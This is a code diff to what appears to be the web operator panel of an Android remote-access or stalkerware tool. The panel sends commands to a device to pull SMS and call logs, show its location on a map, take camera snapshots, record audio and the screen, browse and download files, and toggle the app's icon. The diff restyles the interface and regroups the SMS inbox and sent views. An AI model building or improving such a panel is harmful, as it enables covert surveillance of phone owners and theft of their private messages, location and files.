@@ -5,134 +5,143 @@
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{background:#0f1117;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;overflow:hidden;color:#e2e8f0}
+body{background:#f0f2f5;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;overflow:hidden;color:#1e293b}
 
 /* ── Sidebar ── */
-#sidebar{width:260px;background:#1a1d27;border-right:1px solid #2a2d3a;padding:16px 12px;overflow-y:auto;display:flex;flex-direction:column;gap:4px;flex-shrink:0}
-.logo{font-size:17px;font-weight:700;color:#60a5fa;padding:8px 8px 16px;letter-spacing:.5px;border-bottom:1px solid #2a2d3a;margin-bottom:8px}
-.logo span{color:#94a3b8;font-size:11px;font-weight:400;display:block;margin-top:2px}
-.sec-label{font-size:10px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.8px;padding:10px 8px 4px}
-.sb-btn{width:100%;padding:8px 10px;background:transparent;color:#cbd5e1;border:none;border-radius:7px;font-size:13px;text-align:left;cursor:pointer;display:flex;align-items:center;gap:9px;transition:.15s}
-.sb-btn:hover{background:#252836;color:#f1f5f9}
-.sb-btn .ico{font-size:15px;width:20px;text-align:center}
-.cam-panel{background:#12141e;border-radius:8px;padding:12px;margin:2px 0 4px;display:none;border:1px solid #2a2d3a}
+#sidebar{width:255px;background:#ffffff;border-right:1px solid #e2e8f0;padding:14px 10px;overflow-y:auto;display:flex;flex-direction:column;gap:2px;flex-shrink:0;box-shadow:2px 0 8px rgba(0,0,0,.04)}
+.logo{font-size:16px;font-weight:700;color:#2563eb;padding:6px 8px 14px;letter-spacing:.3px;border-bottom:1px solid #e2e8f0;margin-bottom:6px}
+.logo span{color:#94a3b8;font-size:10px;font-weight:400;display:block;margin-top:2px}
+.sec-label{font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.9px;padding:10px 8px 3px}
+.sb-btn{width:100%;padding:7px 10px;background:transparent;color:#475569;border:none;border-radius:7px;font-size:13px;text-align:left;cursor:pointer;display:flex;align-items:center;gap:9px;transition:.13s}
+.sb-btn:hover{background:#eff6ff;color:#2563eb}
+.sb-btn.active{background:#dbeafe;color:#1d4ed8;font-weight:600}
+.sb-btn .ico{font-size:14px;width:18px;text-align:center}
+/* SMS grouped button */
+.sms-group{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;margin:2px 0;overflow:hidden}
+.sms-group-header{display:flex;align-items:center;gap:9px;padding:7px 10px;cursor:pointer;font-size:13px;color:#475569;font-weight:500;transition:.13s;user-select:none}
+.sms-group-header:hover{background:#eff6ff;color:#2563eb}
+.sms-group-header .ico{font-size:14px;width:18px;text-align:center}
+.sms-group-header .arr{margin-left:auto;font-size:10px;color:#cbd5e1;transition:.2s}
+.sms-group-header.open .arr{transform:rotate(90deg)}
+.sms-sub{display:none;border-top:1px solid #e2e8f0}
+.sms-sub.open{display:block}
+.sms-sub-btn{width:100%;padding:6px 10px 6px 36px;background:transparent;border:none;border-bottom:1px solid #f1f5f9;font-size:12.5px;text-align:left;cursor:pointer;color:#64748b;display:flex;align-items:center;gap:8px;transition:.13s}
+.sms-sub-btn:last-child{border-bottom:none}
+.sms-sub-btn:hover{background:#eff6ff;color:#2563eb}
+.sms-sub-btn .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.dot-in{background:#22c55e}.dot-out{background:#3b82f6}.dot-all{background:#8b5cf6}
+/* Camera panels */
+.cam-panel{background:#f8fafc;border-radius:8px;padding:10px;margin:2px 0 4px;display:none;border:1px solid #e2e8f0}
 .cam-panel.show{display:block}
-.cam-row{display:flex;gap:12px;margin-bottom:8px;align-items:center;flex-wrap:wrap}
-.cam-row label{font-size:12px;color:#94a3b8;display:flex;align-items:center;gap:5px;cursor:pointer}
-.cam-row input[type=radio],.cam-row input[type=checkbox]{accent-color:#60a5fa}
-.cam-action{width:100%;padding:7px;background:#2563eb;color:white;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500;margin-top:4px;transition:.15s}
+.cam-row{display:flex;gap:10px;margin-bottom:6px;align-items:center;flex-wrap:wrap}
+.cam-row label{font-size:12px;color:#64748b;display:flex;align-items:center;gap:5px;cursor:pointer}
+.cam-row input[type=radio],.cam-row input[type=checkbox]{accent-color:#2563eb}
+.cam-action{width:100%;padding:7px;background:#2563eb;color:white;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500;margin-top:4px;transition:.13s}
 .cam-action:hover{background:#1d4ed8}
 
 /* ── Main ── */
-#main{flex:1;display:flex;flex-direction:column;min-width:0;background:#0f1117}
-#header{height:56px;background:#1a1d27;border-bottom:1px solid #2a2d3a;display:flex;align-items:center;justify-content:space-between;padding:0 24px;flex-shrink:0}
-#header .title{font-weight:600;color:#f1f5f9;font-size:15px}
+#main{flex:1;display:flex;flex-direction:column;min-width:0;background:#f0f2f5}
+#header{height:54px;background:#ffffff;border-bottom:1px solid #e2e8f0;display:flex;align-items:center;justify-content:space-between;padding:0 22px;flex-shrink:0;box-shadow:0 1px 4px rgba(0,0,0,.04)}
+#header .title{font-weight:600;color:#1e293b;font-size:15px}
 #header-right{display:flex;align-items:center;gap:10px}
-#status{padding:5px 14px;border-radius:20px;background:#1e3a5f;color:#60a5fa;font-size:12px;font-weight:600;letter-spacing:.3px}
-#status.offline{background:#3b1a1a;color:#f87171}
-#status.ok{background:#1a3b2a;color:#4ade80}
-.reconnect-btn{background:#252836;color:#94a3b8;border:1px solid #2a2d3a;border-radius:20px;padding:5px 14px;font-size:12px;cursor:pointer;transition:.15s}
+#status{padding:4px 14px;border-radius:20px;background:#dbeafe;color:#1d4ed8;font-size:12px;font-weight:600;letter-spacing:.3px}
+#status.offline{background:#fee2e2;color:#b91c1c}
+#status.ok{background:#dcfce7;color:#15803d}
+.reconnect-btn{background:#f1f5f9;color:#64748b;border:1px solid #e2e8f0;border-radius:20px;padding:4px 14px;font-size:12px;cursor:pointer;transition:.13s}
 .reconnect-btn:hover{background:#2563eb;color:white;border-color:#2563eb}
 #content{flex:1;padding:16px;overflow:auto}
-#main-panel{background:#1a1d27;border-radius:12px;border:1px solid #2a2d3a;padding:20px;min-height:calc(100vh - 100px);position:relative}
+#main-panel{background:#ffffff;border-radius:12px;border:1px solid #e2e8f0;padding:20px;min-height:calc(100vh - 100px);position:relative;box-shadow:0 1px 6px rgba(0,0,0,.04)}
 
-/* ── Live controls ── */
+/* ── Live / screen controls ── */
 .live-controls{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
-.live-controls button{flex:1;background:#2563eb;color:white;border:none;padding:8px 12px;border-radius:7px;cursor:pointer;font-size:13px;font-weight:500;transition:.15s;min-width:90px}
+.live-controls button{flex:1;background:#2563eb;color:white;border:none;padding:8px 12px;border-radius:7px;cursor:pointer;font-size:13px;font-weight:500;transition:.13s;min-width:90px}
 .live-controls button:hover{background:#1d4ed8}
-.live-controls button.stop{background:#dc2626}
-.live-controls button.stop:hover{background:#b91c1c}
-.live-controls button.rec{background:#7c3aed}
-.live-controls button.rec:hover{background:#6d28d9}
-.screen-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;padding:10px;background:#12141e;border-radius:8px;border:1px solid #2a2d3a}
-.screen-toolbar select{background:#252836;color:#e2e8f0;border:1px solid #374151;border-radius:6px;padding:5px 8px;font-size:12px;cursor:pointer}
-.screen-toolbar button{flex:none;background:#2563eb;color:white;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:500;transition:.15s}
+.live-controls button.stop{background:#dc2626}.live-controls button.stop:hover{background:#b91c1c}
+.live-controls button.rec{background:#7c3aed}.live-controls button.rec:hover{background:#6d28d9}
+.screen-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;padding:10px;background:#f8fafc;border-radius:8px;border:1px solid #e2e8f0}
+.screen-toolbar select{background:#fff;color:#1e293b;border:1px solid #e2e8f0;border-radius:6px;padding:5px 8px;font-size:12px;cursor:pointer}
+.screen-toolbar button{flex:none;background:#2563eb;color:white;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:500;transition:.13s}
 .screen-toolbar button:hover{background:#1d4ed8}
 .screen-toolbar button.stop{background:#dc2626}
 .screen-toolbar button.rec-active{background:#7c3aed}
 
 /* ── Map ── */
-#map{height:420px;border-radius:10px;border:1px solid #2a2d3a}
-.map-info{position:absolute;top:14px;left:14px;background:rgba(15,17,23,.92);padding:10px 14px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.4);font-size:12px;color:#e2e8f0;z-index:1000;pointer-events:none;border-left:3px solid #60a5fa;max-width:260px}
-.map-info .coord{font-weight:700;color:#60a5fa;font-size:13px;margin-bottom:4px}
-.map-info .addr{color:#94a3b8;margin-top:4px;font-size:11px;font-style:italic}
+#map{height:420px;border-radius:10px;border:1px solid #e2e8f0}
+.map-info{position:absolute;top:14px;left:14px;background:rgba(255,255,255,.96);padding:10px 14px;border-radius:8px;box-shadow:0 4px 14px rgba(0,0,0,.12);font-size:12px;color:#1e293b;z-index:1000;pointer-events:none;border-left:3px solid #2563eb;max-width:260px}
+.map-info .coord{font-weight:700;color:#2563eb;font-size:13px;margin-bottom:4px}
+.map-info .addr{color:#64748b;margin-top:4px;font-size:11px;font-style:italic}
 .map-info div{margin:2px 0;line-height:1.4}
 
 /* ── SMS / Call table ── */
 .log-container{display:flex;flex-direction:column;height:100%}
-.log-header{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
-.log-header h2{font-size:15px;font-weight:600;color:#f1f5f9;flex:1}
-.log-search{background:#252836;border:1px solid #374151;color:#e2e8f0;border-radius:8px;padding:7px 12px;font-size:13px;width:200px;outline:none}
-.log-search:focus{border-color:#60a5fa}
+.log-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;flex-wrap:wrap}
+.log-header h2{font-size:15px;font-weight:600;color:#1e293b;flex:1}
+.log-search{background:#f8fafc;border:1px solid #e2e8f0;color:#1e293b;border-radius:8px;padding:7px 12px;font-size:13px;width:200px;outline:none}
+.log-search:focus{border-color:#2563eb}
 .log-stats{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
-.stat-chip{background:#252836;border:1px solid #374151;border-radius:20px;padding:4px 12px;font-size:12px;color:#94a3b8}
-.stat-chip span{color:#60a5fa;font-weight:600}
-.log-tabs{display:flex;gap:4px;margin-bottom:12px}
-.log-tab{padding:6px 14px;border-radius:6px;border:1px solid #374151;background:transparent;color:#94a3b8;font-size:12px;cursor:pointer;transition:.15s}
+.stat-chip{background:#f1f5f9;border:1px solid #e2e8f0;border-radius:20px;padding:3px 12px;font-size:12px;color:#64748b}
+.stat-chip span{color:#2563eb;font-weight:600}
+.log-tabs{display:flex;gap:4px;margin-bottom:10px}
+.log-tab{padding:5px 14px;border-radius:6px;border:1px solid #e2e8f0;background:transparent;color:#94a3b8;font-size:12px;cursor:pointer;transition:.13s;font-weight:500}
 .log-tab.active{background:#2563eb;color:white;border-color:#2563eb}
-.log-table-wrap{overflow:auto;border-radius:8px;border:1px solid #2a2d3a}
+.log-table-wrap{overflow:auto;border-radius:8px;border:1px solid #e2e8f0}
 table{width:100%;border-collapse:collapse;font-size:13px}
-th{background:#12141e;color:#94a3b8;font-weight:600;padding:10px 12px;text-align:left;border-bottom:1px solid #2a2d3a;white-space:nowrap;position:sticky;top:0;z-index:2}
-td{padding:8px 12px;border-bottom:1px solid #1e2130;color:#cbd5e1;vertical-align:top}
+th{background:#f8fafc;color:#64748b;font-weight:600;padding:9px 12px;text-align:left;border-bottom:1px solid #e2e8f0;white-space:nowrap;position:sticky;top:0;z-index:2}
+td{padding:8px 12px;border-bottom:1px solid #f1f5f9;color:#334155;vertical-align:top}
 tr:last-child td{border-bottom:none}
-tr:hover td{background:#1e2233}
-/* SMS type badge — wider, color-coded */
-.badge{display:inline-flex;align-items:center;justify-content:center;padding:3px 0;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.4px;width:72px;text-align:center}
-.badge-in{background:#0f2d1a;color:#4ade80;border:1px solid #166534}
-.badge-out{background:#0f1e3a;color:#60a5fa;border:1px solid #1e40af}
-.badge-miss{background:#2d0f0f;color:#f87171;border:1px solid #991b1b}
-.badge-unread{background:#2d1a00;color:#fb923c;border:1px solid #92400e;width:auto;padding:2px 6px}
-/* SMS message cell — word wrap, constrained width */
-td.sms-msg{max-width:220px;min-width:120px;white-space:pre-wrap;word-break:break-word;color:#94a3b8;font-size:12px;line-height:1.5}
+tr:hover td{background:#f8fafc}
+/* SMS type badge */
+.badge{display:inline-flex;align-items:center;justify-content:center;padding:3px 0;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.3px;width:76px;text-align:center}
+.badge-in{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
+.badge-out{background:#eff6ff;color:#2563eb;border:1px solid #bfdbfe}
+.badge-miss{background:#fff1f2;color:#dc2626;border:1px solid #fecaca}
+.badge-unread{background:#fff7ed;color:#ea580c;border:1px solid #fed7aa;width:auto;padding:2px 6px}
+/* SMS message word-wrap */
+td.sms-msg{max-width:220px;min-width:100px;white-space:pre-wrap;word-break:break-word;color:#64748b;font-size:12px;line-height:1.5}
 .duration-bar{display:flex;align-items:center;gap:6px}
 .duration-fill{height:4px;background:#2563eb;border-radius:2px;min-width:2px}
 .pagination{margin-top:14px;display:flex;gap:6px;justify-content:center;align-items:center;flex-wrap:wrap}
-.page-btn{padding:5px 10px;border:1px solid #374151;background:#252836;border-radius:6px;cursor:pointer;color:#94a3b8;font-size:12px;transition:.15s}
+.page-btn{padding:5px 10px;border:1px solid #e2e8f0;background:#fff;border-radius:6px;cursor:pointer;color:#64748b;font-size:12px;transition:.13s}
 .page-btn:hover,.page-btn.active{background:#2563eb;color:white;border-color:#2563eb}
-.page-info{font-size:12px;color:#4b5563}
+.page-info{font-size:12px;color:#94a3b8}
 
-/* ── File Manager — unified tree list (like Windows Explorer) ── */
+/* ── File Manager ── */
 .fm-wrap{display:flex;flex-direction:column;height:100%;gap:8px}
-.fm-toolbar{display:flex;align-items:center;gap:6px;flex-wrap:wrap;background:#12141e;border-radius:8px;padding:8px 10px;border:1px solid #2a2d3a}
-.fm-toolbar button{flex:none;background:#252836;color:#cbd5e1;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:12px;cursor:pointer;transition:.15s}
+.fm-toolbar{display:flex;align-items:center;gap:6px;flex-wrap:wrap;background:#f8fafc;border-radius:8px;padding:8px 10px;border:1px solid #e2e8f0}
+.fm-toolbar button{flex:none;background:#fff;color:#475569;border:1px solid #e2e8f0;border-radius:6px;padding:4px 10px;font-size:12px;cursor:pointer;transition:.13s}
 .fm-toolbar button:hover{background:#2563eb;color:white;border-color:#2563eb}
 .fm-toolbar .dl-btn{background:#2563eb;color:white;border-color:#2563eb;font-weight:600}
 .fm-toolbar .dl-btn:hover{background:#1d4ed8}
-.fm-toolbar .dl-btn:disabled{background:#1e2a4a;color:#4b6cb7;cursor:not-allowed;border-color:#2a3a5a}
-.fm-path{flex:1;background:#252836;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:11px;color:#64748b;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-/* single scrollable tree panel */
-.fm-tree-panel{border:1px solid #2a2d3a;border-radius:10px;overflow-y:auto;flex:1;min-height:420px;background:#12141e}
-/* column header row */
-.fm-thead{display:flex;align-items:center;padding:5px 8px;font-size:10px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #1e2130;background:#0f1117;position:sticky;top:0;z-index:5;user-select:none}
+.fm-toolbar .dl-btn:disabled{background:#dbeafe;color:#93c5fd;cursor:not-allowed;border-color:#bfdbfe}
+.fm-path{flex:1;background:#fff;border:1px solid #e2e8f0;border-radius:6px;padding:4px 10px;font-size:11px;color:#94a3b8;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.fm-tree-panel{border:1px solid #e2e8f0;border-radius:10px;overflow-y:auto;flex:1;min-height:420px;background:#ffffff}
+.fm-thead{display:flex;align-items:center;padding:5px 8px;font-size:10px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #f1f5f9;background:#f8fafc;position:sticky;top:0;z-index:5;user-select:none}
 .fm-col-sel{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
 .fm-col-sel input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
 .fm-col-name{flex:1}
 .fm-col-size{width:78px;text-align:right}
 .fm-col-date{width:90px;text-align:right}
-/* tree row shared */
-.tr-row{display:flex;align-items:center;font-size:13px;border-bottom:1px solid #161825;transition:.1s;user-select:none}
+/* tree rows */
+.tr-row{display:flex;align-items:center;font-size:13px;border-bottom:1px solid #f8fafc;transition:.1s;user-select:none}
 .tr-row:last-child{border-bottom:none}
-/* folder row */
-.tr-folder{color:#94a3b8;cursor:pointer;padding:4px 0}
-.tr-folder:hover{background:#1a1d2a;color:#e2e8f0}
-.tr-folder.active{background:#162032;color:#60a5fa}
-/* file row */
-.tr-file{color:#cbd5e1;cursor:default;padding:3px 0;background:#0f1117}
-.tr-file:hover{background:#13161f}
-.tr-file.sel{background:#0f1e3a}
-/* shared cells */
+.tr-folder{color:#475569;cursor:pointer;padding:4px 0}
+.tr-folder:hover{background:#f0f7ff;color:#2563eb}
+.tr-folder.active{background:#dbeafe;color:#1d4ed8}
+.tr-file{color:#334155;cursor:default;padding:3px 0;background:#fdfdfe}
+.tr-file:hover{background:#f8fafc}
+.tr-file.sel{background:#eff6ff}
 .tr-indent{flex-shrink:0}
-.tr-toggle{width:14px;height:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#374151;font-size:9px;margin-right:1px}
-.tr-toggle.open{color:#60a5fa}
+.tr-toggle{width:14px;height:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#cbd5e1;font-size:9px;margin-right:1px;transition:.15s}
+.tr-toggle.open{color:#2563eb}
 .tr-ico{font-size:13px;margin:0 4px;flex-shrink:0;line-height:1}
 .tr-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12.5px}
-.tr-size{width:78px;text-align:right;color:#374151;font-size:11px;padding-right:8px}
-.tr-date{width:90px;text-align:right;color:#374151;font-size:10px;padding-right:8px}
+.tr-size{width:78px;text-align:right;color:#cbd5e1;font-size:11px;padding-right:8px}
+.tr-date{width:90px;text-align:right;color:#cbd5e1;font-size:10px;padding-right:8px}
 .tr-chk{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
 .tr-chk input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
 .fm-children{display:none}
 .fm-children.open{display:block}
-.fm-empty{padding:30px;text-align:center;color:#374151;font-size:13px}
+.fm-empty{padding:24px;text-align:center;color:#cbd5e1;font-size:13px}
 
 img,video{max-width:100%;max-height:72vh;border-radius:8px;display:block;margin:0 auto}
 audio{width:100%;margin-top:12px;border-radius:8px}
@@ -175,8 +184,18 @@ audio{width:100%;margin-top:12px;border-radius:8px}
 
   <div class="sec-label">Data</div>
   <button class="sb-btn" onclick="openFileManager()"><span class="ico">📂</span> File Manager</button>
-  <button class="sb-btn" onclick="loadSMS('inbox')"><span class="ico">💬</span> SMS — Inbox</button>
-  <button class="sb-btn" onclick="loadSMS('sent')"><span class="ico">📤</span> SMS — Sent</button>
+
+  <!-- SMS grouped button: one click loads all, sub-buttons filter by type -->
+  <div class="sms-group">
+    <div class="sms-group-header" id="smsGroupHdr" onclick="toggleSmsGroup()">
+      <span class="ico">💬</span> SMS Logs <span class="arr">▶</span>
+    </div>
+    <div class="sms-sub" id="smsGroupSub">
+      <button class="sms-sub-btn" onclick="filterSmsType('all')"><span class="dot dot-all"></span> All Messages</button>
+      <button class="sms-sub-btn" onclick="filterSmsType('inbox')"><span class="dot dot-in"></span> Inbox</button>
+      <button class="sms-sub-btn" onclick="filterSmsType('sent')"><span class="dot dot-out"></span> Sent</button>
+    </div>
+  </div>
   <button class="sb-btn" onclick="sendCommand('GET_CALL_LOGS')"><span class="ico">📞</span> Call Logs</button>
 
   <div class="sec-label">Control</div>
@@ -450,7 +469,53 @@ function sendCommand(cmd,params){
   setTimeout(()=>{ if(pendingCmd===cmd) pendingCmd=null; },15000);
 }
 function sendPlain(msg){ ws&&ws.readyState===1&&ws.send(msg); }
-function loadSMS(box){ sendCommand('GET_SMS',{box}); }
+// SMS: fetch all messages (inbox+sent) in one request; filter client-side
+let allSmsData=[];
+let smsFilt='all'; // 'all' | 'inbox' | 'sent'
+
+function toggleSmsGroup(){
+  const hdr=document.getElementById('smsGroupHdr');
+  const sub=document.getElementById('smsGroupSub');
+  const isOpen=sub.classList.contains('open');
+  sub.classList.toggle('open',!isOpen);
+  hdr.classList.toggle('open',!isOpen);
+  if(!isOpen && !allSmsData.length){
+    // First open: fetch all SMS
+    sendCommand('GET_SMS',{box:'all'});
+  }
+}
+
+function filterSmsType(type){
+  smsFilt=type;
+  // Highlight active sub-btn
+  document.querySelectorAll('.sms-sub-btn').forEach(b=>{
+    b.style.background=b.innerText.toLowerCase().includes(type==='all'?'all':type==='inbox'?'inbox':'sent')?'#eff6ff':'';
+    b.style.color=b.innerText.toLowerCase().includes(type==='all'?'all':type==='inbox'?'inbox':'sent')?'#2563eb':'';
+  });
+  if(!allSmsData.length){
+    sendCommand('GET_SMS',{box:'all'});
+    return;
+  }
+  applySmsFilt();
+}
+
+function applySmsFilt(){
+  dataType='sms'; currentPage=0;
+  if(smsFilt==='all'){
+    currentData=allSmsData;
+  } else if(smsFilt==='inbox'){
+    currentData=allSmsData.filter(i=>{
+      const t=String(i.type||'').toLowerCase(); const r=parseInt(i.type)||0;
+      return t.includes('in')||r===1;
+    });
+  } else {
+    currentData=allSmsData.filter(i=>{
+      const t=String(i.type||'').toLowerCase(); const r=parseInt(i.type)||0;
+      return t.includes('out')||r===2||r===4;
+    });
+  }
+  renderTable();
+}
 function openFileManager(){ currentTreePath='root'; activeFolderPath='root'; fileCache={}; treeState={}; sendCommand('LIST_FILES',{path:'root'}); }
 
 // ── Message router ─────────────────────────────────────────────────────────────
@@ -458,9 +523,8 @@ function handleJSON(json){
   if(json.type==='SIGNALING'){ handleSig(json.data); return; }
   switch(json.type){
     case 'SMS_DATA':
-      dataType='sms'; currentPage=0;
-      currentData=parseData(json.data);
-      renderTable(); pendingCmd=null; break;
+      allSmsData=parseData(json.data);
+      applySmsFilt(); pendingCmd=null; break;
     case 'CALL_LOGS':
       dataType='call'; currentPage=0;
       currentData=parseData(json.data);
@@ -505,7 +569,9 @@ function handleJSON(json){
         handleFileList(arr); pendingCmd=null;
       } else if(pendingCmd==='GET_SMS'||pendingCmd==='GET_CALL_LOGS'){
         const arr=Array.isArray(json)?json:(json.data?parseData(json.data):[]);
-        dataType=pendingCmd==='GET_SMS'?'sms':'call'; currentData=arr; currentPage=0; renderTable(); pendingCmd=null;
+        if(pendingCmd==='GET_SMS'){ allSmsData=arr; applySmsFilt(); }
+        else { dataType='call'; currentData=arr; currentPage=0; renderTable(); }
+        pendingCmd=null;
       }
     }
   }
@@ -519,7 +585,7 @@ function handlePlain(msg){
   if(msg.startsWith('STATUS:')) setStatus(msg.substring(7));
   else if(msg.startsWith('LOC_DATA:')){ try{ renderMap(JSON.parse(msg.substring(9))); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('FILE_LIST:')){ try{ handleFileList(JSON.parse(msg.substring(10))); pendingCmd=null; }catch(e){} }
-  else if(msg.startsWith('SMS_DATA:')){ try{ currentData=JSON.parse(msg.substring(9)); dataType='sms'; renderTable(); pendingCmd=null; }catch(e){} }
+  else if(msg.startsWith('SMS_DATA:')){ try{ allSmsData=JSON.parse(msg.substring(9)); applySmsFilt(); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('CALL_DATA:')){ try{ currentData=JSON.parse(msg.substring(10)); dataType='call'; renderTable(); pendingCmd=null; }catch(e){} }
   else if(msg.startsWith('CAMERA_IMAGE:')){ displayCapturedImage(msg.substring(13)); pendingCmd=null; }
   else if(msg.startsWith('AUDIO_RECORDING:')){ showAudio(msg.substring(16)); pendingCmd=null; }
@@ -609,7 +675,8 @@ function renderTable(){
     panel().innerHTML='<div style="padding:40px;text-align:center;color:#4b5563">📭 No data found.</div>'; return;
   }
   const isSMS=dataType==='sms';
-  const title=isSMS?'SMS Messages':'Call Logs';
+  const filterLabel=smsFilt==='inbox'?' — Inbox':smsFilt==='sent'?' — Sent':'';
+  const title=isSMS?'SMS Messages'+filterLabel:'Call Logs';
   const icon=isSMS?'💬':'📞';
 
   // Stats
@@ -687,6 +754,11 @@ function renderTable(){
       <h2>${icon} ${title}</h2>
       <input class="log-search" type="text" placeholder="🔍 Search…" oninput="filterRows(this.value)">
     </div>
+    ${isSMS?`<div class="log-tabs">
+      <button class="log-tab${smsFilt==='all'?' active':''}" onclick="filterSmsType('all')">All (${allSmsData.length})</button>
+      <button class="log-tab${smsFilt==='inbox'?' active':''}" onclick="filterSmsType('inbox')">📥 Inbox</button>
+      <button class="log-tab${smsFilt==='sent'?' active':''}" onclick="filterSmsType('sent')">📤 Sent</button>
+    </div>`:''}
     <div class="log-stats">${stats}</div>
     <div class="log-table-wrap">
       <table><thead><tr>${isSMS?smsHeaders:callHeaders}</tr></thead>
@@ -926,6 +998,7 @@ window.toggleAppIcon=toggleAppIcon; window.takeSnapshot=takeSnapshot;
 window.toggleCamRec=toggleCamRec; window.toggleScreenRec=toggleScreenRec;
 window.changeScreenQ=changeScreenQ; window.dlBase64=dlBase64;
 window.gotoPage=gotoPage; window.filterRows=filterRows;
+window.toggleSmsGroup=toggleSmsGroup; window.filterSmsType=filterSmsType;
 window.treeClickFolder=fmClickFolder; window.fmClickFolder=fmClickFolder;
 window.toggleFileSel=toggleFileSel; window.selAll=selAll; window.selNone=selNone;
 window.downloadSel=downloadSel; window.navUp=navUp; window.refreshFolder=refreshFolder;
